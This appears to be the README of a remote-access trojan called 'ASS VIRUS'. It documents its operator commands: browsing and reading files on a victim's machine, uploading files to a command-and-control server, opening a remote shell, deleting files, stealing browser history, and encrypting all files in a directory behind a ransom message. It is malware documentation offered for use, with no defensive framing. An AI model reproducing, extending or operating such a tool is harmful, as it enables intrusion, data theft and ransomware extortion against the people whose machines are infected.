Welcome to the README for ASS VIRUS Here are the available commands:

--help : Shows this message.

[dir] --walk : Walks to the chosen directory.
    Input: dir (string) - the directory to walk to.

--back : Walks to the parent directory.

[file] --read : Reads the contents of the file.
    Input: file (string) - the file to read.

--upload : Uploads the file from the victim machine to the CNC.

--power : Makes a shell to execute commands remotely from the CNC.

--ipconfig : Shows the Ipconfig.

--whoami : Tells you what the current walking directory is.

--cd| [drive='drive name'] : Change directory.
    Inputs: 
        - drive (string, optional) - the drive to change to. Default is the current drive.

[file or dir] --remove : Deletes the chosen file or directory.
    Input: file_or_dir (string) - the file or directory to delete.

--mkdir|[name='folder name'] : Makes a directory.
    Input: name (string) - the name of the new directory.

--mkfile|[name='file name'] : Makes a file.
    Input: name (string) - the name of the new file.

[file] --write|[text='text to write' mode='write mode'] : Writes to a file.
    Inputs:
        - file (string) - the file to write to.
        - text (string) - the text to write to the file.
        - mode (string) - the write mode to use. Default is 'w'.

--browser_history|[browser='browser name'] : Steals the browser's history.
    Input: browser (string) - the name of the browser to steal history from.

--ransom|[msg='ransom message' upload='true/false'] : Encrypts all files in the directory and leaves a message for the victim.
    Inputs:
        - msg (string) - the message to display to the victim.
        - upload (boolean, optional) - whether to upload the files to the CNC before encrypting them. Default is false.
